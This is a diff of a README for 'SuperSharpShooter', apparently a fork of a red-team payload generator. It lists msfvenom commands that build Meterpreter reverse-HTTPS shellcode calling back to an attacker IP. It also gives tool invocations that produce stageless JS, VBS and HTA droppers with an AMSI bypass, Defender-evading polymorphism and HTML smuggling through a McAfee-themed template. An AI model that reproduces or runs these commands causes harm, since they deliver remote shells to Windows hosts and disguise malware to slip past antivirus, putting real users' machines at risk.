@@ -1,17 +1,36 @@
 Forking... and fixing a couple of things.
 
 What's new:
-1. AMSI bypasses less path/fname dependent on target.  Also worked on both the JS and VBS versions in this respect
-2. It's 2021 and we needed Defender Bypass... because hardcoded super simple shit string "SharpShooter" just too damn simple.  ...and added a bit of polymorphism
-3. Ported to python3... might be more left to do (worth exploring/reporting)
-4. Code cleanup and paving the way for going harder in on OOB methodologies
-5. I can confirm AMSI bypass + Defender bypass + stageless JS and also stageless smuggled JS work...  VBS unable to test due to isolation and lack of .NET 3.5 (2,3).
-6. Probably more I'm forgetting
+1. Fixed the amsiEnable bypass to use the filelocation-independent version
+2. Added polymorphism to the string "SharpShooter", which was popping Defender signature-based detections (seriously, that's all you got?).  This is enabled by default and cannot be disabled
+3. Fixed .NET v4 js, vbs, hta sharpshooterv4 and stagelessv4
+4. Ported to python3 (sorry but not sorry if python2 support lost?)
 
+I can confirm that stageless js, vbs, and hta all work.  Can also confirm amsi bypass and defender bypass works (at least at this time).  Can also confirm HTML smuggling stageless works.
+
+### Generate the shellcodes
+msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.49.83 LPORT=443 -e x64/xor_dynamic  -b '\\x00\\x0a\\x0d' -f raw  > rawsc.bin
+msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.49.83 LPORT=443 -e x64/xor_dynamic  -b '\\x00\\x0a\\x0d' -f raw  > csharpsc.txt  ### you'll need to remove all variable wrapping such that only the bytes remain
+
+### Core stageless
+./SuperSharpShooter.py --stageless --dotnetver 4 --rawscfile rawsc.bin --payload js --output test
+./SuperSharpShooter.py --stageless --dotnetver 4 --rawscfile rawsc.bin --payload vbs --output test
+./SuperSharpShooter.py --stageless --dotnetver 4 --rawscfile rawsc.bin --payload hta --output test
+
+### Core with AMSI bypass
+./SuperSharpShooter.py --stageless --dotnetver 4 --rawscfile rawsc.bin --payload js --output test --amsi amsienable
+./SuperSharpShooter.py --stageless --dotnetver 4 --rawscfile rawsc.bin --payload vbs --output test --amsi amsienable
+./SuperSharpShooter.py --stageless --dotnetver 4 --rawscfile rawsc.bin --payload hta --output test --amsi amsienable
+
+### Core with AMSI Bypass and HTML Smuggling
+./SuperSharpShooter.py --stageless --dotnetver 4 --rawscfile rawsc.bin --payload js --output test --amsi amsienable --smuggle --template mcafee
+./SuperSharpShooter.py --stageless --dotnetver 4 --rawscfile rawsc.bin --payload vbs --output test --amsi amsienable --smuggle --template mcafee
 
 
 Big ups MDSec!
 Original project:  https://github.com/mdsecactivebreach/SharpShooter
+
+##### We'll retain the unabridged Readme.md below ######
 =========== =========== =========== =========== =========== =========== =========== ===========
 ```
    _____ __                    _____ __                __           
